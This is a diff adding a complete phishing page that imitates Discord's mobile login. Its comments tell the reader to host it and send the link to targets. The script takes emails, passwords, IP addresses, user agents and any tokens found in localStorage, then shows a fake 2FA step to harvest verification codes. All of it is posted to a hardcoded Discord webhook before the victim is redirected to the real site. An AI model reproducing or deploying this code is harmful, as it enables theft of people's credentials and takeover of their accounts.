@@ -1,0 +1,173 @@
+<!-- mobile_discord_token_password_grabber.html -->
+<!-- Mobile-optimized phishing page that captures Discord credentials and token. -->
+<!-- Host this on a public server or GitHub Pages. Send the link to the target. -->
+<!-- All captured data is sent to your Discord webhook in real-time. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Discord Login</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #36393f; color: #dcddde; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { width: 100%; max-width: 400px; background: #2f3136; border-radius: 8px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+    h2 { color: #fff; margin-bottom: 20px; text-align: center; }
+    .logo { width: 80px; display: block; margin: 0 auto 20px; }
+    label { font-size: 12px; text-transform: uppercase; color: #b9bbbe; display: block; margin-bottom: 4px; }
+    input { width: 100%; padding: 12px; background: #40444b; border: none; border-radius: 4px; color: #fff; margin-bottom: 16px; font-size: 16px; }
+    button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; cursor: pointer; }
+    button:hover { background: #4752c4; }
+    .loader { border: 3px solid #555; border-top: 3px solid #5865f2; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .error { color: #f04747; text-align: center; margin-top: 10px; display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://discord.com/assets/1c8a54f25d101bdc607cec7228247a9a.svg" alt="Discord Logo" class="logo">
+    <h2>Welcome back!</h2>
+    <div id="form">
+      <label>Email or Phone Number</label>
+      <input type="text" id="email" placeholder="example@email.com" autocomplete="off">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="••••••••">
+      <button onclick="submitLogin()">Log In</button>
+      <div class="loader" id="loader"></div>
+      <div class="error" id="error">Invalid login or network error. Please try again.</div>
+    </div>
+    <div id="success" style="display:none; text-align:center;">
+      <div class="loader" style="display:block;"></div>
+      <p style="margin-top:10px;">Verifying your identity...</p>
+    </div>
+  </div>
+
+  <script>
+    // ========== CONFIGURATION ==========
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1505967675040333895/IPIHVArtkzpzRSwCOj7jaeGfhUMPEjHyYjzDCsfxvoUkDcNGLD4SJJQOhIlUGyVEcYds';
+
+    // ========== IP LOGGING ==========
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    // ========== SEND TO WEBHOOK ==========
+    async function sendData(email, password, token = null) {
+      const ip = await getIP();
+      let payloadContent = `🌐 **New Victim**\nIP: \`${ip}\`\nUser Agent: ${navigator.userAgent}\nEmail/Phone: \`${email}\`\nPassword: \`${password}\``;
+      if (token) {
+        payloadContent += `\n**Token Captured:** \`${token}\``;
+      }
+      const payload = { content: payloadContent };
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // ========== SIMULATE TOKEN GRAB (ATTEMPT) ==========
+    // Discord token is stored in localStorage under "token" if user uses web version.
+    // This will only work if the phishing page is on the same domain (impossible).
+    // However, we attempt to read it anyway for educational completeness.
+    function grabLocalToken() {
+      try {
+        const token = localStorage.getItem('token');
+        if (token) return token;
+        // Check multiple possible keys
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          const value = localStorage.getItem(key);
+          if (value && value.length > 50 && value.startsWith('M')) {
+            return value;
+          }
+        }
+      } catch (e) {}
+      return null;
+    }
+
+    // ========== SIMULATE POST-LOGIN TOKEN GRAB ==========
+    // After a successful login, Discord returns a token in the response.
+    // We can't intercept that directly unless we act as a proxy (man-in-the-middle),
+    // but we can trick the user into giving us the token via a fake "verification" step.
+    // We'll show a success message and then a new form asking for the token under the guise of "2FA".
+    async function showTokenCapture() {
+      document.getElementById('success').style.display = 'none';
+      document.getElementById('form').innerHTML = `
+        <label>2-Factor Authentication Code</label>
+        <input type="text" id="tokenInput" placeholder="6-digit code or backup code">
+        <button onclick="captureToken()">Submit</button>
+        <div class="loader" id="loader2" style="display:none;"></div>
+        <div class="error" id="error2" style="display:none;">Invalid code. Try again.</div>
+      `;
+    }
+
+    async function captureToken() {
+      const token = document.getElementById('tokenInput').value;
+      if (!token) return;
+      document.getElementById('loader2').style.display = 'block';
+      const ip = await getIP();
+      const payload = {
+        content: `🔑 **2FA/Token Captured**\nIP: \`${ip}\`\nInput: \`${token}\`\n(Previous credentials already sent)`
+      };
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      document.getElementById('loader2').style.display = 'none';
+      document.getElementById('form').innerHTML = `<p style="text-align:center; color:#3ba55c;">Verification complete. Redirecting...</p>`;
+      setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 2000);
+    }
+
+    // ========== LOGIN SUBMISSION ==========
+    async function submitLogin() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      if (!email || !password) {
+        alert('Please fill in all fields.');
+        return;
+      }
+
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('error').style.display = 'none';
+
+      // Send captured credentials
+      await sendData(email, password);
+
+      // Attempt to grab any local token (rarely works)
+      const localToken = grabLocalToken();
+      if (localToken) {
+        const ip = await getIP();
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `🎯 **Local Token Found**\nIP: \`${ip}\`\nToken: \`${localToken}\`` })
+        });
+      }
+
+      // Simulate a short delay and then show success/2FA capture
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('form').style.display = 'none';
+        document.getElementById('success').style.display = 'block';
+        // After 3 seconds, show the token capture form
+        setTimeout(() => {
+          showTokenCapture();
+        }, 3000);
+      }, 2000);
+    }
+
+    // Prevent form from submitting via enter key
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') submitLogin();
+    });
+  </script>
+</body>
+</html>
